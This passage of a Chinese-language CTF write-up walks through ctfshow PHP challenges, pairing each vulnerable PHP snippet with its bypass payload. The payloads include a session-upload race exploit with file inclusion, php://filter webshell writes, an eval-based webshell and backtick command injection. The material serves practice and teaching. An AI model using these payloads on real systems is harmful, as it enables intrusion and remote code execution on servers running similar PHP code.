class="string">&quot;upload&quot;</span>: io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls&#x27;);echo &#x27;ca01h&#x27;;?&gt;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url=url, files=files, data=data, cookies=cookie)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        req = session.get(url=url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessid)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ca01h&#x27;</span> in req.text:</span><br><span class="line">            <span class="keyword">print</span>(req.text)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">50</span>):</span><br><span class="line">    with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
<h3 id="web82-86">web82-86</h3>
<p><a href="https://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/">https://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI实现RCE/</a></p>
<p>其中web85</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>(strpos($content, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="web87-TODO">**web87[TODO]</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.$content);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
<p>思路：两次URLencode编码绕过过滤，php://filter绕过死亡退出，其中有两种方法都可以bypass。</p>
<p>第一种方法使用base64 decode编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;a.php</span><br></pre></td></tr></table></figure>
<p>第二种方法使用strip_tags，但是PHP版本太高，strip_tags已经不让用了。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201021155449.png" alt=""></p>
<h2 id="web入门-PHP特性">web入门 PHP特性</h2>
<h3 id="web89">web89</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数组绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num[]&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="web90">web90</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>小数点或字母绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;4476a</span><br><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure>
<h3 id="web91">web91</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>换行符绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;%0aphp</span><br></pre></td></tr></table></figure>
<h3 id="web92">web92</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>小数点绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure>
<p>科学计数法绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;4476e1&#x27;</span>==<span class="number">4476</span>); <span class="comment">// bool(false)</span></span><br><span class="line">var_dump(<span class="string">&#x27;4476e1&#x27;</span>==<span class="number">44760</span>);  <span class="comment">// bool(true)</span></span><br><span class="line">var_dump(intval(<span class="string">&#x27;4476e1&#x27;</span>)); <span class="comment">// int(44760)</span></span><br></pre></td></tr></table></figure>
<h3 id="web93">web93</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>小数点绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure>
<h3 id="web94">web94</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>小数点绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;4476.0</span><br></pre></td></tr></table></figure>
<h3 id="web95">web95</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201022140900.png" alt=""></p>
<p>用八进制绕过，又由于0不能出现在第一个字符，可以用空格或+绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;+10574</span><br></pre></td></tr></table></figure>
<h3 id="web96">web96</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?u&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web97">web97</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>md5强等号用数组绕过，返回NULL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
<h3 id="web98">web98</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_COOKIE:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_SERVER:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$flag:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一开始没太看懂这个题目的意思，后来百度才知道PHP的&amp;也有引用的功能。</p>
<p>所以第二行代码的意思就是：如果存在GET请求则引用POST请求的内容，否则<code>$_GET='flag'</code>。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;</span><br><span class="line">POST HTTP_FLAG&#x3D;flag</span><br></pre></td></tr></table></figure>
<h3 id="web99">**web99</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array($_GET[<span class="string">&#x27;n&#x27;</span>], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[<span class="string">&#x27;n&#x27;</span>], $_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里考察in_array函数的特性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow1 = <span class="keyword">array</span>(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">var_dump(in_array(<span class="string">&#x27;10.php&#x27;</span>,$allow1));  <span class="comment">// bool(true)</span></span><br><span class="line">$allow2 = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">var_dump(in_array(<span class="number">0</span>,$allow2));  <span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>由于该函数并未将第三个参数设置为 <strong>true</strong> ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 <strong>7shell.php</strong> 。因为PHP在使用 <strong>in_array()</strong> 函数判断时，会将 <strong>7shell.php</strong> 强制转换成数字7，而数字7在 <strong>range(1,24)</strong> 数组中，最终绕过 <strong>in_array()</strong> 函数判断，</p>
</blockquote>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?n&#x3D;10.php</span><br><span class="line">content&#x3D;&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web100">web100</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;?&gt;&lt;?&#x3D;&#96;cat ctfshow.php&#96;?&gt;&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure>
<p>还可以使用get_class_vars()函数获取类属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;get_class_vars&amp;v3&#x3D;);</span><br></pre></td></tr></table></figure>
<h3 id="web101">**web101</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PHP获取类属性的几种方法：<a href="https://my.oschina.net/u/3544550/blog/1489826">https://my.oschina.net/u/3544550/blog/1489826</a></p>
<p>这里是使用反射API，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo(new ReflectionClass&amp;v3&#x3D;);</span><br></pre></td></tr></table></figure>
<h3 id="web102">**web102</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>思路不太好想，PHP5的版本下payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET: ?v2&#x3D;0x3c3f3d60746163202a603b3f3e&amp;v3&#x3D;sh.php</span><br><span class="line">POST: v1&#x3D;hex2bin</span><br><span class="line"></span><br><span class="line">echo hex2bin(&#39;3c3f3d60746163202a603b3f3e&#39;) \\ &lt;?&#x3D;&#96;tac *&#96;;?&gt;</span><br></pre></td></tr></table></figure>
<p>但是这个payload在php7下无法实现，主要原因是该版本的十六进制表示法中的字符串不再被视为数字字符串，即is_numeric（） 现在返回 <code>FALSE。</code></p>
<p>所以这道题就有些脑洞了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造需要写入文件的payload</span><br><span class="line">&lt;?&#x3D;&#96;cat *&#96;;</span><br><span class="line">使用base64编码后：PD89YGNhdCAqYDs</span><br><span class="line">使用bin2hex函数将字符串转成十六进制的内容：5044383959474e6864434171594473</span><br><span class="line">&#x2F;&#x2F;这里有个巧妙之处，刚好只有一个e，识别成了科学计数法，很顶</span><br><span class="line">而这里的v3也需要进行修改成伪协议的方式</span><br><span class="line">最后的Payload:</span><br><span class="line">GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;sh.php</span><br><span class="line">POST:v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure>
<blockquote>
<p>出题人：<a href="https://cnblogs.com/erR0Ratao/p/13731541.html">https://cnblogs.com/erR0Ratao/p/13731541.html</a></p>
</blockquote>
<h3 id="web103">web103</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>同上</p>
<h3 id="web104">web104</h3>
